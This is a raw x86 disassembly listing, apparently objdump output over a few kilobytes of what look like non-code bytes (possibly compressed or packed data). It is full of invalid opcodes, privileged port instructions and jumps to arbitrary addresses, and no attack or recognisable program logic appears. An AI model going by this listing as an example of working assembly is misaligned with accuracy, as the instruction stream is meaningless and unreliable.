  42065b:	add    ebp,DWORD PTR [edi-0x42]
  42065e:	dec    eax
  42065f:	pop    edx
  420660:	(bad)  
  420661:	fdiv   st,st(0)
  420663:	sub    BYTE PTR [eax-0x6f],dh
  420666:	mov    esi,0x946ca7d
  42066b:	cmp    ah,BYTE PTR [edx+esi*4-0x6640f78]
  420672:	jmp    0x584bd154
  420677:	(bad)  es:[ebp+0x41b2baf8]
  42067e:	mov    bh,0x63
  420680:	xchg   ebp,eax
  420681:	sahf   
  420682:	je     0x42065f
  420684:	mov    ah,0x77
  420686:	jns    0x4206f5
  420688:	and    BYTE PTR [esi],ah
  42068a:	sbb    al,0x1b
  42068c:	lods   al,BYTE PTR ds:[esi]
  42068d:	loope  0x42065f
  42068f:	jae    0x420616
  420691:	(bad)  
  420692:	mov    esi,0x47828a84
  420697:	xor    esp,DWORD PTR [ebx+0x21ed6e69]
  42069d:	in     al,dx
  42069e:	pushf  
  42069f:	mov    ah,0x8f
  4206a1:	jae    0x4206da
  4206a3:	sub    al,0xb6
  4206a5:	jbe    0x4206dd
  4206a7:	les    eax,FWORD PTR ds:0x8829a926
  4206ad:	imul   esi,edi,0x2e
  4206b0:	mov    cl,0x3a
  4206b2:	push   cs
  4206b3:	pop    esp
  4206b4:	mov    cl,0x1b
  4206b6:	test   eax,0x61746501
  4206bb:	cwde   
  4206bc:	and    eax,0x877c63e6
  4206c1:	icebp  
  4206c2:	stos   DWORD PTR es:[di],eax
  4206c4:	mov    bh,0x25
  4206c6:	scas   eax,DWORD PTR es:[edi]
  4206c7:	xor    DWORD PTR [esi-0x7a82d6b5],edi
  4206cd:	sbb    dl,BYTE PTR [ebp+0x332e1a93]
  4206d3:	cmc    
  4206d4:	repnz lahf 
  4206d6:	mov    ds:0x7bc473ac,al
  4206db:	dec    ebx
  4206dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206dd:	jno    0x4206a1
  4206df:	adc    bh,ch
  4206e1:	sahf   
  4206e2:	outs   dx,DWORD PTR ds:[esi]
  4206e3:	and    ecx,DWORD PTR [ecx]
  4206e5:	cmp    al,0xee
  4206e7:	xchg   ecx,eax
  4206e8:	push   ecx
  4206e9:	outs   dx,DWORD PTR ds:[esi]
  4206ea:	cwde   
  4206eb:	jg     0x42069c
  4206ed:	int    0x4a
  4206ef:	push   ebx
  4206f0:	lods   al,BYTE PTR ds:[esi]
  4206f1:	push   0x59f0f1f9
  4206f6:	and    DWORD PTR ds:0xe2171637,edi
  4206fc:	in     eax,0xbf
  4206fe:	or     BYTE PTR [ebx],bl
  420700:	jecxz  0x4206db
  420702:	push   cs
  420703:	(bad)  
  420704:	stos   DWORD PTR es:[edi],eax
  420705:	ret    0x919b
  420708:	jl     0x420739
  42070a:	stc    
  42070b:	xchg   DWORD PTR [eax],edx
  42070d:	mov    fs,eax
  42070f:	jae    0x4206f1
  420711:	je     0x420790
  420713:	xor    al,0xc3
  420715:	xor    dl,BYTE PTR [eax-0x17be8d30]
  42071b:	(bad)  
  42071c:	nop
  42071d:	add    eax,ebx
  42071f:	jmp    0x4206fd
  420721:	inc    ebx
  420722:	(bad)  
  420723:	jmp    0xb452:0x9267e4a
  42072a:	push   0xffffff99
  42072c:	mov    esi,0xbb88fc7d
  420731:	cld    
  420732:	loop   0x42070a
  420734:	mov    cl,0xec
  420736:	je     0x420711
  420738:	xlat   BYTE PTR ds:[ebx]
  420739:	mov    BYTE PTR [edx],bl
  42073b:	pushf  
  42073c:	cmp    dl,BYTE PTR ds:0x1c1504be
  420742:	icebp  
  420743:	call   0x44a4:0xb292ee75
  42074a:	inc    ecx
  42074b:	pop    ebx
  42074c:	inc    edi
  42074d:	xchg   ebp,eax
  42074e:	cmp    cl,ah
  420750:	xor    bl,ch
  420752:	mul    ah
  420754:	jmp    0x775d3840
  420759:	jo     0x420729
  42075b:	in     al,dx
  42075c:	pop    ebx
  42075d:	hlt    
  42075e:	jmp    0x4206e3
  420760:	xchg   ebx,eax
  420761:	les    ecx,FWORD PTR [edi-0x20]
  420764:	mov    cx,ss
  420767:	fucomp st(7)
  420769:	mov    esi,0x98982d07
  42076e:	out    dx,eax
  42076f:	mov    esi,0x55726e6f
  420774:	dec    eax
  420775:	xchg   ebx,eax
  420776:	sti    
  420777:	mov    ?,WORD PTR [ecx]
  420779:	out    0x6b,eax
  42077b:	jno    0x420744
  42077d:	int3   
  42077e:	(bad)  
  42077f:	retf   
  420780:	pop    es
  420781:	mov    al,ds:0xbddd672e
  420786:	fsubr  DWORD PTR [esi+0x39bf1ffb]
  42078c:	pop    edx
  42078d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42078e:	add    eax,0xd6398655
  420793:	adc    BYTE PTR [edi+edi*4+0x5c],al
  420797:	icebp  
  420798:	shr    dh,0x40
  42079b:	bound  esi,QWORD PTR [ebp-0x2e16e435]
  4207a1:	outs   dx,DWORD PTR ds:[esi]
  4207a2:	cmp    DWORD PTR [eax+0x3],0x22
  4207a6:	int    0xd2
  4207a8:	pop    esi
  4207a9:	xchg   DWORD PTR [edi],edx
  4207ab:	mov    BYTE PTR ds:0x263f11c6,0xae
  4207b2:	(bad)  
  4207b3:	mov    al,0x26
  4207b5:	std    
  4207b6:	data16 (bad) 
  4207b8:	div    BYTE PTR [esi+eiz*1+0x36cbd358]
  4207bf:	in     al,dx
  4207c0:	shr    BYTE PTR [ebp+0x78],0x1b
  4207c4:	fcomp  DWORD PTR [ecx-0x3460248e]
  4207ca:	int    0xd2
  4207cc:	mov    ah,0x5
  4207ce:	das    
  4207cf:	xor    al,0x6b
  4207d1:	xor    edi,edx
  4207d3:	and    eax,0x47465134
  4207d8:	lea    eax,[ebp-0x4d]
  4207db:	mov    dh,0x2a
  4207dd:	pop    esi
  4207de:	sbb    BYTE PTR [esp+ecx*2-0x5e46eb2b],al
  4207e5:	jns    0x420805
  4207e7:	sub    ecx,eax
  4207e9:	stos   DWORD PTR es:[edi],eax
  4207ea:	cmp    eax,0x8b216cc3
  4207ef:	push   0xfffffff5
  4207f1:	inc    ebx
  4207f2:	sub    al,0xed
  4207f4:	add    ecx,DWORD PTR [ebx+0x18]
  4207f7:	mov    esi,0x1c96b2c3
  4207fc:	lock leave 
  4207fe:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  420800:	imul   ebx,DWORD PTR [ebx-0x18a5cd69],0xffffffc6
  420807:	shr    DWORD PTR [ebp-0x5e],1
  42080a:	sar    bl,1
  42080c:	cwde   
  42080d:	out    dx,eax
	...
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx-0x56e9d003]
  420828:	mov    edi,0x18504b9
  42082d:	add    ah,bh
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [eax-0x36],dh
  420834:	dec    edx
  420835:	loop   0x42083c
  420837:	scas   eax,DWORD PTR es:[edi]
  420838:	fbstp  TBYTE PTR [ebx]
  42083a:	inc    edx
  42083b:	jecxz  0x420824
  42083d:	mov    esi,0x79fb24e
  420842:	(bad)  
  420844:	xor    eax,0x2e398595
  420849:	das    
  42084a:	adc    BYTE PTR [edx],ah
  42084c:	test   eax,0x7c1f87e2
  420851:	adc    al,0x19
  420853:	ror    DWORD PTR ds:[eax-0x25e042bc],1
  42085a:	or     esi,0x185a1a54
  420860:	test   eax,0x93ae1ed0
  420865:	xchg   esp,eax
  420866:	(bad)  
  420867:	outs   dx,BYTE PTR ds:[esi]
  420868:	mov    cl,BYTE PTR [ebx-0x398a8f2c]
  42086e:	aas    
  42086f:	retf   
  420870:	inc    edi
  420871:	fld    DWORD PTR [ebp+0x38]
  420874:	sbb    bl,cl
  420876:	jne    0x420820
  420878:	pop    ecx
  420879:	arpl   WORD PTR [ebx-0x78],ax
  42087c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42087e:	jp     0x4208ea
  420880:	popf   
  420881:	pop    es
  420882:	add    BYTE PTR [edx+eiz*1],bh
  420885:	rcpps  xmm1,XMMWORD PTR [edx]
  420888:	inc    edi
  420889:	pop    ss
  42088a:	sbb    DWORD PTR [ecx+0x3a337db9],ebp
  420890:	rcr    DWORD PTR [edx+0x5d],cl
  420893:	into   
  420894:	jbe    0x42083e
  420896:	lods   al,BYTE PTR ds:[esi]
  420897:	dec    ebx
  420898:	mov    ah,0x3
  42089a:	pop    edx
  42089b:	fistp  QWORD PTR [ebp+0x2aa49e49]
  4208a1:	xlat   BYTE PTR ds:[ebx]
  4208a2:	adc    DWORD PTR [edx+ecx*1+0x46],esp
  4208a6:	and    BYTE PTR [edi+0x5c],bl
  4208a9:	mov    BYTE PTR [edi],dh
  4208ab:	mov    cl,0xbe
  4208ad:	rcr    DWORD PTR [ebp-0x1a],1
  4208b0:	adc    ecx,DWORD PTR [esi+0x49]
  4208b3:	push   cs
  4208b4:	adc    BYTE PTR [edi-0x256e4614],cl
  4208ba:	adc    BYTE PTR [ecx],bh
  4208bc:	adc    ebx,DWORD PTR [edx]
  4208be:	pushf  
  4208bf:	cmp    edx,DWORD PTR [esi]
  4208c1:	cmp    al,0x4b
  4208c3:	cmp    ebp,DWORD PTR ds:0x767b62f8
  4208c9:	(bad)  
  4208ca:	out    dx,al
  4208cb:	mov    DWORD PTR [eax+eiz*2],esp
  4208ce:	daa    
  4208cf:	and    BYTE PTR ss:[ecx+ebp*1-0x49a66ab8],bl
  4208d7:	adc    edi,DWORD PTR ds:0x26e6704e
  4208dd:	mov    eax,0x7306a1a
  4208e2:	xor    ebx,ecx
  4208e4:	adc    ebp,esp
  4208e6:	repnz or bl,cl
  4208e9:	inc    eax
  4208ea:	ins    DWORD PTR es:[edi],dx
  4208eb:	xchg   DWORD PTR [ecx+ecx*2+0x45],ecx
  4208ef:	mov    ebx,0x56099960
  4208f4:	push   0x52
  4208f6:	ror    BYTE PTR [ecx],0x81
  4208f9:	das    
  4208fa:	lods   al,BYTE PTR ds:[esi]
  4208fb:	ret    
  4208fc:	rcl    ecx,1
  4208fe:	jmp    0x5d0fe78e
  420903:	test   eax,0x72563ec5
  420908:	xchg   esp,eax
  420909:	mov    al,ds:0x7bca0db
  42090e:	test   BYTE PTR [ebp+0x25246e05],al
  420914:	retf   
  420915:	mov    bl,BYTE PTR [ebx+ecx*8-0xaccda34]
  42091c:	pop    es
  42091d:	jb     0x420936
  42091f:	mov    ch,0xbf
  420921:	and    BYTE PTR [edx],0x14
  420924:	and    eax,esp
  420926:	cli    
  420927:	int    0x47
  420929:	clc    
  42092a:	ret    0x8dde
  42092d:	mov    al,0x1c
  42092f:	cmp    esi,DWORD PTR [eax+eax*1-0x58]
  420933:	out    0xac,al
  420935:	sub    ah,BYTE PTR [ecx+0x1a]
  420938:	test   BYTE PTR [ebp+0x4999b43c],al
  42093e:	rcl    BYTE PTR [ebp-0x43],cl
  420941:	adc    ecx,DWORD PTR [ebx-0x5a5ca9a1]
  420947:	mov    cl,0x82
  420949:	loope  0x4209c6
  42094b:	jmp    0x2dc3:0x1fbe34
  420952:	xor    ch,bh
  420954:	call   0x3fbc:0x8ac84d78
  42095b:	fdivp  st(0),st
  42095d:	fs jnp 0x4209bf
  420960:	fiadd  DWORD PTR [eax+0x73]
  420963:	pop    esp
  420964:	push   edx
  420965:	in     eax,dx
  420966:	out    0x6a,al
  420968:	or     eax,ecx
  42096a:	jmp    0x42091c
  42096c:	or     cl,BYTE PTR [esi+0x39]
  42096f:	addr16 int3 
  420971:	pushf  
  420972:	adc    al,0xda
  420974:	mov    edx,DWORD PTR [eax-0x4550314c]
  42097a:	mov    eax,ds:0xcc641ae3
  42097f:	dec    esp
  420980:	and    BYTE PTR [esi+eax*4-0x1e],0x6e
  420985:	cwde   
  420986:	jns    0x4209f6
  420988:	int3   
  420989:	call   0x9369cc11
  42098e:	out    0x96,al
  420990:	xchg   edx,eax
  420991:	sbb    BYTE PTR [edx+ebx*2-0x42fe987b],cl
  420998:	call   0xa98d:0xee2d9c
  42099f:	sbb    ebp,DWORD PTR [esp+ebp*4+0x6644794c]
  4209a6:	inc    edx
  4209a7:	push   ecx
  4209a8:	xlat   BYTE PTR ds:[ebx]
  4209a9:	mov    BYTE PTR [ebx-0x73],ah
  4209ac:	repnz cmp cl,BYTE PTR [edx-0xa1e73ae]
  4209b3:	xor    eax,0x6c27d229
  4209b8:	mov    cl,0x81
  4209ba:	xor    eax,esp
  4209bc:	rol    ch,0xcd
  4209bf:	add    BYTE PTR [eax-0x5d],dh
  4209c2:	out    0xfe,al
  4209c4:	aas    
  4209c5:	mov    ah,0x7e
  4209c7:	les    eax,FWORD PTR [ebx*8-0x53d15705]
  4209ce:	mov    ecx,0xa0aff1f0
  4209d3:	pop    esi
  4209d4:	push   0xe
  4209d6:	sbb    edi,DWORD PTR [edx+0x54]
  4209d9:	mov    eax,ds:0x9565d330
  4209de:	adc    al,0xc8
  4209e0:	jb     0x420a1a
  4209e2:	push   es
  4209e3:	jle    0x420a0a
  4209e5:	aaa    
  4209e6:	arpl   WORD PTR ds:0xab7e3861,sp
  4209ec:	inc    edx
  4209ed:	mov    DWORD PTR [ebx],edx
  4209ef:	popf   
  4209f0:	mov    dl,0xe2
  4209f2:	push   es
  4209f3:	sar    BYTE PTR [edx+0x4e],0xd5
  4209f7:	cmp    al,0x77
  4209f9:	into   
  4209fa:	fistp  QWORD PTR [eax+0x2b]
  4209fd:	mov    ds:0x351a46c9,al
  420a02:	into   
  420a03:	shl    BYTE PTR [edx+0x1f3ade73],0xe6
  420a0a:	outs   dx,BYTE PTR ds:[esi]
  420a0b:	fs std 
  420a0d:	call   0x81cbffb0
  420a12:	test   DWORD PTR ds:0x672f7f93,ecx
  420a18:	push   ebx
  420a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a1a:	add    BYTE PTR [eax+0x11],dh
  420a1d:	adc    cl,BYTE PTR [eax+0x29361177]
  420a23:	call   0x9c190e90
  420a28:	cs enter 0x91c7,0x24
  420a2d:	cdq    
	...
  420a3a:	pop    es
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420a47
  420a47:	push   0x8700a9e6
  420a4c:	add    DWORD PTR [eax],eax
  420a4e:	cld    
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    BYTE PTR [ebx],bl
  420a53:	int3   
  420a54:	test   BYTE PTR [ecx],0xd8
  420a57:	sbb    eax,0xffff1a85
  420a5c:	jmp    0x1b5893a5
  420a61:	cmp    eax,0x60eca42e
  420a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a68:	lock dec esi
  420a6a:	sub    bl,dh
  420a6c:	adc    bl,BYTE PTR [eax-0x71]
  420a6f:	scas   eax,DWORD PTR es:[edi]
  420a70:	scas   eax,DWORD PTR es:[edi]
  420a71:	test   DWORD PTR [edx+0x3a],esp
  420a74:	pop    ds
  420a75:	fcomp  DWORD PTR [edi]
  420a77:	xor    BYTE PTR [ecx-0xe376eb6],ch
  420a7d:	inc    ecx
  420a7e:	pop    edx
  420a7f:	sub    BYTE PTR [ebx+0x1a],bl
  420a82:	dec    ecx
  420a83:	jle    0x420a0c
  420a85:	pop    ss
  420a86:	dec    ebp
  420a87:	push   ds
  420a88:	adc    ebp,eax
  420a8a:	inc    esp
  420a8b:	call   0xb8b5:0x18f6b8b9
  420a92:	add    DWORD PTR [eax-0x224ace57],ebp
  420a98:	test   al,0xc8
  420a9a:	mov    cl,0x75
  420a9c:	mov    dl,0xbe
  420a9e:	mov    edx,0x42a43ee6
  420aa3:	leave  
  420aa4:	icebp  
  420aa5:	fdivr  DWORD PTR ds:0xe0dc6be7
  420aab:	iret   
  420aac:	daa    
  420aad:	dec    esi
  420aae:	ja     0x420afe
  420ab0:	icebp  
  420ab1:	retf   0xa70f
  420ab4:	mov    bl,0x2e
  420ab6:	(bad)  
  420ab8:	jl     0x420a98
  420aba:	les    ecx,FWORD PTR [esi]
  420abc:	test   esp,ebp
  420abe:	rcr    DWORD PTR [edi-0x51],cl
  420ac1:	mov    edi,0x67cfddb7
  420ac6:	test   al,0x42
  420ac8:	inc    esi
  420ac9:	mov    al,0x7b
  420acb:	aam    0x14
  420acd:	jecxz  0x420afa
  420acf:	sbb    esi,DWORD PTR [esi-0x44]
  420ad2:	sub    ch,BYTE PTR [edi+0x30]
  420ad5:	aam    0x5
  420ad7:	cmp    DWORD PTR [edi-0x5c29918e],edx
  420add:	and    eax,0x8f896c0f
  420ae2:	or     esp,edi
  420ae4:	push   cs
  420ae5:	jp     0x420a82
  420ae7:	je     0x420b20
  420ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aea:	(bad)  
  420aeb:	cmp    eax,0xedeef024
  420af0:	mov    ds:0xc1f4c8b2,al
  420af5:	push   eax
  420af6:	fimul  WORD PTR [eax-0x25]
  420af9:	add    eax,DWORD PTR [ebp+0x6f]
  420afc:	jo     0x420b0f
  420afe:	mov    esp,0x2659af78
  420b03:	push   ebx
  420b04:	popa   
  420b05:	push   edi
  420b06:	adc    al,0xcc
  420b08:	pop    esi
  420b09:	xor    bh,BYTE PTR [eax+0x3af3f766]
  420b0f:	retf   
  420b10:	inc    esi
  420b11:	dec    ecx
  420b12:	push   eax
  420b13:	push   0xffffff8f
  420b15:	dec    esp
  420b16:	(bad)  
  420b18:	sbb    BYTE PTR [ecx-0x67f43540],0x51
  420b1f:	push   ss
  420b20:	jb     0x420b0e
  420b22:	dec    ebp
  420b23:	test   eax,0x3b2b10a8
  420b28:	inc    esp
  420b29:	outs   dx,DWORD PTR ds:[esi]
  420b2a:	xor    DWORD PTR [esi],esp
  420b2c:	pop    esp
  420b2d:	or     bl,BYTE PTR [edi]
  420b2f:	sub    eax,0xb693621f
  420b34:	outs   dx,BYTE PTR ds:[esi]
  420b35:	push   edx
  420b36:	pop    ebp
  420b37:	mov    DWORD PTR [ecx],0x30bac13e
  420b3d:	sub    ebp,ebp
  420b3f:	dec    esp
  420b40:	mov    al,0xa6
  420b42:	push   esp
  420b43:	retf   
  420b44:	fld    st(4)
  420b46:	sub    ch,al
  420b48:	and    edx,edx
  420b4a:	add    esi,edx
  420b4c:	mov    dl,bl
  420b4e:	jo     0x420b93
  420b50:	mov    dh,0x4c
  420b52:	jp     0x420bbb
  420b54:	(bad)  
  420b55:	shl    DWORD PTR [eax-0x71],0x50
  420b59:	push   edi
  420b5a:	xchg   ebp,eax
  420b5c:	mov    ds,edx
  420b5e:	jns    0x420afa
  420b60:	scas   eax,DWORD PTR es:[edi]
  420b61:	mov    ?,WORD PTR [esi+0x39]
  420b64:	sbb    eax,eax
  420b66:	jnp    0x420b5e
  420b68:	add    BYTE PTR [ecx*2-0x51a9daf0],ch
  420b6f:	adc    esi,DWORD PTR [edi-0x5e]
  420b72:	rol    BYTE PTR [edx-0x22],cl
  420b75:	nop
  420b76:	shl    BYTE PTR [edx],0x9
  420b79:	mov    ebp,0x2c81cc5
  420b7e:	add    al,0xb4
  420b80:	out    0xad,eax
  420b82:	mov    WORD PTR [esi+0x6c],?
  420b85:	pop    es
  420b86:	inc    ebx
  420b87:	lea    esp,[eax-0x42]
  420b8a:	cwde   
  420b8b:	pop    esp
  420b8c:	fnstcw WORD PTR [edx-0x59]
  420b8f:	and    eax,ecx
  420b91:	fmul   DWORD PTR [ecx+0x171aa162]
  420b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b98:	pop    es
  420b99:	lahf   
  420b9a:	lea    ebx,ds:0xc1dc06cf
  420ba0:	xchg   ecx,eax
  420ba1:	mov    al,0x55
  420ba3:	pop    ebp
  420ba4:	jmp    0x420bb5
  420ba6:	sub    BYTE PTR [ecx],ah
  420ba8:	fidivr DWORD PTR ds:0x7819a689
  420bae:	mov    eax,ds:0x9d3ef87b
  420bb3:	pop    ebp
  420bb4:	lods   al,BYTE PTR ds:[esi]
  420bb5:	fldcw  WORD PTR [edx]
  420bb7:	push   cs
  420bb8:	adc    eax,0x8304582b
  420bbd:	std    
  420bbe:	in     al,dx
  420bbf:	xchg   esi,eax
  420bc0:	enter  0x45fe,0x17
  420bc4:	xchg   edi,eax
  420bc5:	pop    edx
  420bc6:	pop    ebp
  420bc7:	mov    WORD PTR [esi+esi*1],ss
  420bca:	push   ss
  420bcb:	rcl    DWORD PTR [esi-0x3cb5eafb],0x85
  420bd2:	add    bl,BYTE PTR [ebp-0x54]
  420bd5:	dec    ebp
  420bd6:	int3   
  420bd7:	lods   eax,DWORD PTR ds:[esi]
  420bd8:	mov    esi,0x5bae81dc
  420bdd:	clc    
  420bde:	add    ecx,DWORD PTR [ebp+0x4e]
  420be1:	mov    ah,0x51
  420be3:	xchg   edi,eax
  420be4:	pop    ebx
  420be5:	imul   BYTE PTR [edi-0x6b]
  420be8:	mov    ds:0x2e414a68,al
  420bed:	(bad)  
  420bee:	out    dx,eax
  420bef:	cmp    al,0x72
  420bf1:	dec    edx
  420bf2:	xor    dh,dl
  420bf4:	sbb    al,0xae
  420bf6:	jbe    0x420c4a
  420bf8:	jno    0x420be6
  420bfa:	in     al,dx
  420bfb:	retf   
  420bfc:	mov    esp,0x22fbb3e6
  420c01:	pushf  
  420c02:	jmp    0x46e2644c
  420c07:	jecxz  0x420c64
  420c09:	adc    al,ch
  420c0b:	mov    ds:0x3494d14e,al
  420c10:	je     0x420bfc
  420c12:	sbb    DWORD PTR [eax-0x3111bc17],ebx
  420c18:	xor    eax,esi
  420c1a:	arpl   WORD PTR [eax+0x5f],cx
  420c1d:	popa   
  420c1e:	daa    
  420c1f:	jecxz  0x420bf1
  420c21:	pop    esi
  420c22:	adc    DWORD PTR [ecx],0xcde07b6e
  420c28:	pusha  
  420c29:	sub    eax,0x7f5c1e
  420c2e:	sub    al,ah
  420c30:	add    DWORD PTR [esi],eax
  420c32:	xor    DWORD PTR [ebp-0x635bd29d],ebx
  420c38:	jnp    0x420c57
  420c3a:	add    esi,DWORD PTR [edx]
  420c3c:	jmp    0x420c08
  420c3e:	pop    ebx
  420c3f:	and    eax,0x1b4664fa
  420c44:	pop    eax
  420c45:	les    eax,FWORD PTR [esi+0x59]
  420c48:	imul   esi,DWORD PTR [ebx+0x18],0x5f
  420c4c:	bound  ecx,QWORD PTR ds:0x0
	...
  420c5a:	push   ds
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    WORD PTR [eax+0x13],fs
  420c68:	xor    eax,0x188fc92
  420c6d:	add    ah,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    dl,cl
  420c73:	pop    ds
  420c74:	rcl    bh,cl
  420c76:	sbb    al,0x81
  420c78:	mov    ah,0x5c
  420c7a:	adc    al,0xd2
  420c7c:	inc    eax
  420c7d:	ds push ebp
  420c7f:	adc    BYTE PTR [eax-0x25185a47],dl
  420c85:	inc    esi
  420c86:	mov    esp,0x340163e5
  420c8b:	jl     0x420c91
  420c8d:	fisubr DWORD PTR [edi]
  420c8f:	out    0xf6,al
  420c91:	xor    DWORD PTR [eax-0x67],0xb4bfabf9
  420c98:	aad    0xa
  420c9a:	int3   
  420c9b:	shl    ebp,0x87
  420c9e:	pop    fs
  420ca0:	mov    cl,0x6c
  420ca2:	and    al,BYTE PTR [ebp+0x3f]
  420ca5:	mov    bh,0xec
  420ca7:	pop    esi
  420ca8:	paddusw mm2,QWORD PTR [esi-0x36]
  420cac:	mov    esp,0x5c096fad
  420cb1:	add    eax,0x6ce6b549
  420cb6:	call   0xda009827
  420cbb:	sub    ebp,ebp
  420cbd:	call   0xea70:0x14a19770
  420cc4:	xor    ebp,DWORD PTR [esi+0x7b]
  420cc7:	fidivr WORD PTR ds:0x542b3d8c
  420ccd:	fld    QWORD PTR [edi+0x1c]
  420cd0:	push   edx
  420cd1:	fisubr DWORD PTR [ebx+0xd9ed279]
  420cd7:	adc    BYTE PTR [edx],bl
  420cd9:	push   cs
  420cda:	nop
  420cdb:	xor    esp,DWORD PTR ds:0xe0cc5158
  420ce1:	inc    ebx
  420ce2:	xchg   edx,eax
  420ce3:	ret    
  420ce4:	dec    ecx
  420ce5:	into   
  420ce6:	push   esi
  420ce7:	ins    DWORD PTR es:[edi],dx
  420ce8:	ret    
  420ce9:	pop    ds
  420cea:	bound  edx,QWORD PTR [esi+0x17]
  420ced:	repnz les edx,FWORD PTR [ebx-0xf1dd3c7]
  420cf4:	cmp    al,ch
  420cf6:	pop    edx
  420cf7:	popa   
  420cf8:	or     al,0x44
  420cfa:	mov    DWORD PTR [edx+0x17],ebp
  420cfd:	loopne 0x420cc0
  420cff:	cld    
  420d00:	ja     0x420cf3
  420d02:	xchg   ecx,eax
  420d03:	ja     0x420d2e
  420d05:	imul   ebx,ebp,0x55b26c39
  420d0b:	jae    0x420d60
  420d0d:	or     eax,0x9d96600a
  420d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d13:	outs   dx,BYTE PTR ds:[esi]
  420d14:	call   FWORD PTR [edi-0x45]
  420d17:	clc    
  420d18:	test   eax,0x7cd4dc26
  420d1d:	scas   al,BYTE PTR es:[edi]
  420d1e:	xchg   ecx,eax
  420d1f:	adc    eax,0x9215c399
  420d24:	add    ebx,ebx
  420d26:	out    0x7,eax
  420d28:	mov    BYTE PTR [esi+0x21],dh
  420d2b:	fidivr DWORD PTR [eax+0x37946f67]
  420d31:	push   ebp
  420d32:	jo     0x420cdc
  420d34:	pop    ebp
  420d35:	adc    cl,BYTE PTR [eax+0x2e]
  420d38:	(bad)  
  420d39:	mov    edi,0xa7aa8c79
  420d3e:	pop    ebp
  420d3f:	dec    ecx
  420d40:	push   cs
  420d41:	jge    0x420d3e
  420d43:	das    
  420d44:	jne    0x420d67
  420d46:	mov    al,0x5b
  420d48:	push   ss
  420d49:	lods   eax,DWORD PTR ds:[esi]
  420d4a:	aaa    
  420d4b:	test   eax,0x86f64b43
  420d50:	scas   eax,DWORD PTR es:[edi]
  420d51:	repnz xchg ebp,eax
  420d53:	leave  
  420d54:	mov    BYTE PTR [eax+0x36],dl
  420d57:	daa    
  420d58:	or     ebp,DWORD PTR [esi-0x1]
  420d5b:	daa    
  420d5c:	out    dx,al
  420d5d:	(bad)  
  420d5e:	xor    edx,ebx
  420d60:	arpl   cx,dx
  420d62:	sub    al,ch
  420d64:	add    al,0xe2
  420d66:	in     al,0x95
  420d68:	cmp    al,0x5a
  420d6a:	cli    
  420d6b:	in     eax,0x4e
  420d6d:	push   cs
  420d6e:	nop
  420d6f:	or     cl,dl
  420d71:	inc    esp
  420d72:	cmp    esp,ebp
  420d74:	out    dx,eax
  420d75:	sub    DWORD PTR [esi-0x55],ebp
  420d78:	push   0x13
  420d7a:	popf   
  420d7b:	or     BYTE PTR [esi],al
  420d7d:	enter  0x7dd0,0xae
  420d81:	test   DWORD PTR [eax+edi*4+0x1c9bc0e6],0x8df6e8a9
  420d8c:	popf   
  420d8d:	test   DWORD PTR [ebp+0x54],edx
  420d90:	scas   eax,DWORD PTR es:[edi]
  420d91:	xchg   ebx,eax
  420d92:	pop    es
  420d93:	mov    ebp,0xf33e0a39
  420d98:	lahf   
  420d99:	xchg   edi,eax
  420d9a:	mov    ah,0x40
  420d9c:	inc    ecx
  420d9d:	cmp    dh,BYTE PTR [edi]
  420d9f:	mov    BYTE PTR [edx-0x6f],bl
  420da2:	adc    bl,bl
  420da4:	(bad)  
  420da6:	popa   
  420da7:	mov    eax,ds:0x88c4bc3c
  420dac:	fcmovnu st,st(6)
  420dae:	in     eax,0x1e
  420db0:	pop    es
  420db1:	push   0xffffffbe
  420db3:	mov    ebp,ecx
  420db5:	in     al,dx
  420db6:	js     0x420dcd
  420db8:	push   ecx
  420db9:	std    
  420dba:	adc    esi,ebp
  420dbc:	mov    dh,0x3c
  420dbe:	in     al,dx
  420dbf:	sbb    DWORD PTR [edi-0x687c9aaa],ebp
  420dc5:	(bad)  
  420dc6:	dec    ecx
  420dc7:	pop    esp
  420dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dc9:	test   BYTE PTR [edi],0xe7
  420dcc:	ret    0x8709
  420dcf:	or     ebx,DWORD PTR [esi-0xfcdc8b9]
  420dd5:	int    0x33
  420dd7:	or     eax,0x7c8bf836
  420ddc:	mov    ch,0x26
  420dde:	xor    esp,DWORD PTR [ebx]
  420de0:	repnz xlat BYTE PTR ds:[ebx]
  420de2:	adc    ah,BYTE PTR [ebp+0x39e96219]
  420de8:	cmp    ah,dl
  420dea:	retf   0xe738
  420ded:	loop   0x420dec
  420def:	and    al,0x37
  420df1:	push   ds
  420df2:	stos   DWORD PTR es:[edi],eax
  420df3:	cmp    al,0x35
  420df5:	in     al,dx
  420df6:	xor    ah,bl
  420df8:	les    ebp,FWORD PTR [ecx]
  420dfa:	sub    BYTE PTR [edi-0x5],ah
  420dfd:	loopne 0x420dbc
  420dff:	aas    
  420e00:	mov    cl,0xf0
  420e02:	adc    al,0x43
  420e04:	pop    esi
  420e05:	add    ch,BYTE PTR [edx-0xdff2d03]
  420e0b:	xor    BYTE PTR [esi+eax*8-0x58],al
  420e0f:	xor    BYTE PTR [ecx+0xa],0xd4
  420e13:	add    BYTE PTR [esi-0x285ddab9],bl
  420e19:	xchg   ebp,eax
  420e1a:	sub    bl,bl
  420e1c:	inc    ecx
  420e1d:	loop   0x420e5c
  420e1f:	nop
  420e20:	ins    BYTE PTR es:[edi],dx
  420e21:	not    BYTE PTR [ecx-0x6e]
  420e24:	jae    0x420e53
